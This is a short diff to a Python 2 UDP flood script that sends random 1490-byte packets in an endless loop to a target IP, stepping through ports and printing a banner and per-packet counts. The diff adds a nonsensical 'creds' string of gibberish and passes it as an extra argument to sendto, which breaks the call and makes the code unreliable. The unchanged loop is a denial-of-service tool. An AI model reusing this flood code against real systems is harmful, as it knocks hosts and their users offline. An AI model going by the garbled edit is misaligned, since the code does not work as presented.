@@ -15,6 +15,7 @@ year = now.year
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
+creds = '\nshsj-$+$+$+\n+$+$+$+uejdjdhdjdhdhddhdhdh\nejdj$+#$#$@'
 os.system("clear")
 print B+"@@@@@@@@ @@@      @@@@@@@@   @@@@@@@@  @@@@@@@@"
 print "@@@@@@@@ @@@     @@@@@@@@@@ @@@@@@@@@@ @@@   @@@@"
@@ -35,7 +36,7 @@ time.sleep(3)
 print
 sent = 0
 while True:
-     sock.sendto(bytes, (ip,port))
+     sock.sendto(bytes, creds, (ip,port))
      sent = sent + 1
      port = port + 1
      print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
